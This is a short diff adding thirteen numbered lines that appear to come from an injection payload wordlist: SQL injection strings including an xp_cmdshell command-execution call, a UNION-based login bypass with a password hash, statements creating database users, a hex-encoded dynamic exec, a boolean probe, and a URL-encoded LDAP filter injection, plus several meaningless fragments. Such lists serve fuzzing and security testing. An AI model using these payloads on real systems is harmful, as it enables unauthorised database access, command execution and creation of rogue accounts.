@@ -1,0 +1,13 @@
+10 t'exec master..xp_cmdshell 'nslookup www.google.com'-- 
+182 -- &password  =  
+205 1234 " AND 1  =  0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 
+220 *| 
+281 as 
+426 insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )    
+432 %2A%28%7C%28objectclass%3D%2A%29%29 
+555 create user name identified by 'pass123' 
+710 ns 
+758 \x27UNION SELECT 
+984 make_set  (  5679  =  9769,9769  )   
+1087 declare @q nvarchar   (  200  )   0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  )  
+1094 ^' 
